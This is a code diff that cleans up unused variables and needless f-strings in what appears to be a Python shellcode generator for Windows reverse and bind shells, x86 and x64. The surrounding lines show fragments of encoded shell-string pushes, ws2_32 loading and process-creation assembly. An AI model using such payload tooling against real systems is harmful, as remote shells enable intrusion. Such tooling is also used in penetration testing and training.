@@ -293,16 +293,6 @@ def windows_reverse_shell(host, port, bad_chars=None, shell="cmd.exe"):
     if bad_chars is None:
         bad_chars = {0x00}
 
-    # Convert IP address to dword (network byte order)
-    ip_parts = [int(x) for x in host.split(".")]
-    ip_dword = (
-            (ip_parts[0]) | (ip_parts[1] << 8) | (ip_parts[2] << 16) | (
-                ip_parts[3] << 24)
-    )
-
-    # Port in network byte order (swap bytes)
-    port_word = ((port & 0xFF) << 8) | (port >> 8)
-
     # Build shell string push instructions using NEG encoding
     # We push the string in reverse (right to left) in 4-byte chunks
     shell_bytes = shell.encode("ascii") + b"\x00"  # null-terminate
@@ -325,7 +315,7 @@ def windows_reverse_shell(host, port, bad_chars=None, shell="cmd.exe"):
 
         shell_asm += f"    mov eax, 0x{encoded:08x}           ; Encoded value\n"
         shell_asm += f"    neg eax                       ; NEG to get 0x{dword:08x}\n"
-        shell_asm += f"    push eax                      ; Push shell string chunk\n"
+        shell_asm += "    push eax                      ; Push shell string chunk\n"
 
     return {
         "bad_chars": bad_chars,
@@ -346,7 +336,7 @@ def windows_reverse_shell(host, port, bad_chars=None, shell="cmd.exe"):
                 "dll": "ws2_32.dll",
                 # This will trigger LoadLibraryA for ws2_32.dll
                 "args": [],
-                "custom_asm": f"""
+                "custom_asm": """
     ; ===== After boilerplate with pre_resolve, we have: =====
     ; [ebp+0x04] = find_function address
     ; [ebp+0x08] = LoadLibraryA
@@ -522,20 +512,6 @@ def windows_reverse_shell_x64(host, port, bad_chars=None, shell="cmd.exe"):
     if bad_chars is None:
         bad_chars = {0x00}
 
-    # Convert IP address to qword (network byte order)
-    ip_parts = [int(x) for x in host.split(".")]
-    ip_dword = (
-            (ip_parts[0]) | (ip_parts[1] << 8) | (ip_parts[2] << 16) | (
-                ip_parts[3] << 24)
-    )
-
-    # Port in network byte order (swap bytes)
-    port_word = ((port & 0xFF) << 8) | (port >> 8)
-
-    # Build sockaddr_in: AF_INET (2) | port (2 bytes) | IP (4 bytes) | padding (8 bytes)
-    # Packed as qword for easier setup
-    sockaddr_qword = 0x02 | (port_word << 16) | (ip_dword << 32)
-
     # Build shell string storage instructions using NEG encoding for x64
     # We store the string in memory at [r15+0x180] using 8-byte chunks
     shell_bytes = shell.encode("ascii") + b"\x00"  # null-terminate
@@ -585,7 +561,7 @@ def windows_reverse_shell_x64(host, port, bad_chars=None, shell="cmd.exe"):
                 "dll": "ws2_32.dll",
                 # This will trigger LoadLibraryA for ws2_32.dll
                 "args": [],
-                "custom_asm": f"""
+                "custom_asm": """
     ; ===== After boilerplate with pre_resolve, we have: =====
     ; [rbp+0x08] = lookup_func address
     ; [rbp+0x10] = LoadLibraryA (resolved by boilerplate)
@@ -763,9 +739,6 @@ def windows_bind_shell(port, bad_chars=None, shell="cmd.exe"):
     if bad_chars is None:
         bad_chars = {0x00}
 
-    # Port in network byte order (swap bytes)
-    port_word = ((port & 0xFF) << 8) | (port >> 8)
-
     # Build shell string push instructions using NEG encoding
     # We push the string in reverse (right to left) in 4-byte chunks
     shell_bytes = shell.encode("ascii") + b"\x00"  # null-terminate
@@ -788,7 +761,7 @@ def windows_bind_shell(port, bad_chars=None, shell="cmd.exe"):
 
         shell_asm += f"    mov eax, 0x{encoded:08x}           ; Encoded value\n"
         shell_asm += f"    neg eax                       ; NEG to get 0x{dword:08x}\n"
-        shell_asm += f"    push eax                      ; Push shell string chunk\n"
+        shell_asm += "    push eax                      ; Push shell string chunk\n"
 
     return {
         "bad_chars": bad_chars,
@@ -809,7 +782,7 @@ def windows_bind_shell(port, bad_chars=None, shell="cmd.exe"):
                 "dll": "ws2_32.dll",
                 # This will trigger LoadLibraryA for ws2_32.dll
                 "args": [],
-                "custom_asm": f"""
+                "custom_asm": """
     ; ===== After boilerplate with pre_resolve, we have: =====
     ; [ebp+0x04] = find_function address
     ; [ebp+0x08] = LoadLibraryA
@@ -939,10 +912,10 @@ def windows_bind_shell(port, bad_chars=None, shell="cmd.exe"):
     pop edi                       ; Save STARTUPINFOA pointer in EDI
 
     ; ===== Build command string "{shell}" =====
-{shell_asm}    
+{shell_asm}
     push esp                      ; Pointer to shell string
     pop ebx                       ; Save pointer to shell in EBX for later use
-    
+
     ; ===== Allocate PROCESS_INFORMATION and call CreateProcessA =====
     mov eax, esp
     xor ecx, ecx
@@ -1007,9 +980,6 @@ def windows_bind_shell_x64(port, bad_chars=None, shell="cmd.exe"):
     if bad_chars is None:
         bad_chars = {0x00}
 
-    # Port in network byte order (swap bytes)
-    port_word = ((port & 0xFF) << 8) | (port >> 8)
-
     # Build shell string storage instructions using NEG encoding for x64
     # We store the string in memory at [r15+0x180] using 8-byte chunks
     shell_bytes = shell.encode("ascii") + b"\x00"  # null-terminate
@@ -1059,7 +1029,7 @@ def windows_bind_shell_x64(port, bad_chars=None, shell="cmd.exe"):
                 "dll": "ws2_32.dll",
                 # This will trigger LoadLibraryA for ws2_32.dll
                 "args": [],
-                "custom_asm": f"""
+                "custom_asm": """
     ; ===== After boilerplate with pre_resolve, we have: =====
     ; [rbp+0x08] = lookup_func address
     ; [rbp+0x10] = LoadLibraryA (resolved by boilerplate)
@@ -1454,8 +1424,8 @@ def list_payloads():
 
     # Windows payloads with architecture display
     printer.print_section("Windows Payloads:", "bold cyan")
-    for name, (func, description, archs) in PAYLOADS["windows"].items():
-        printer.print_text(f"  • ", "yellow", end="")
+    for name, (_func, description, archs) in PAYLOADS["windows"].items():
+        printer.print_text("  • ", "yellow", end="")
         printer.print_text(f"{name:28s}", "bold white", end="")
 
         # Display supported architectures
@@ -1467,8 +1437,8 @@ def list_payloads():
 
     # Linux payloads with architecture display
     printer.print_section("Linux Payloads:", "bold cyan")
-    for name, (func, description, archs) in PAYLOADS["linux"].items():
-        printer.print_text(f"  • ", "yellow", end="")
+    for name, (_func, description, archs) in PAYLOADS["linux"].items():
+        printer.print_text("  • ", "yellow", end="")
         printer.print_text(f"{name:28s}", "bold white", end="")
 
         # Display supported architectures
@@ -1484,7 +1454,7 @@ def list_payloads():
 
     # Build matrix for Windows payloads
     win_rows = []
-    for name, (func, description, archs) in PAYLOADS["windows"].items():
+    for name, (_func, _description, archs) in PAYLOADS["windows"].items():
         row = [name]
         row.append("✓" if "x86" in archs else "✗")
         row.append("✓" if "x64" in archs else "✗")
@@ -1498,7 +1468,7 @@ def list_payloads():
 
     # Build matrix for Linux payloads
     linux_rows = []
-    for name, (func, description, archs) in PAYLOADS["linux"].items():
+    for name, (_func, _description, archs) in PAYLOADS["linux"].items():
         row = [name]
         row.append("✓" if "x86" in archs else "✗")
         row.append("✓" if "x64" in archs else "✗")
